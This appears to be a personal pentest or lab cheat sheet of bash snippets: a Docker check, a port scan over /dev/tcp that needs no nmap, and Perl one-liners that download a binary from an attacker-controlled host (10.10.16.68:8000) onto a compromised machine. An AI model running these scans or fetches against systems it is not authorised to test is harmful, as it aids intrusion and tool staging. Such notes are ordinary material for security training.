
```bash
# to output in a file
cat > users.txt <<EOF
a
b
c
EOF
```

check if inside docker:
```bash
test -f /.dockerenv && echo "Inside Docker" || echo "Not in Docker"

```

scan without nmap
```bash
for port in 22 80 111 445 2049 3306 5432 8080; do
  timeout 1 bash -c "echo > /dev/tcp/172.18.0.1/$port" 2>/dev/null && echo "Port $port is OPEN"
done


for port in 22 80 111 445 2049 3306 5432 8080; do timeout 1 bash -c "echo > /dev/tcp/192.168.100.200/$port" 2>/dev/null && echo "Port $port is OPEN" ;done
```


download files using perl
```bash
# Download with Perl
perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("<IP>:8000");print $s "GET /<FILE_NAME> HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">nfsclient";binmode F;print F while<$s>;close F'
perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.16.68:8000");print $s "GET /nfsclient-linux-amd64 HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">nfsclient";binmode F;print F while<$s>;close F'
```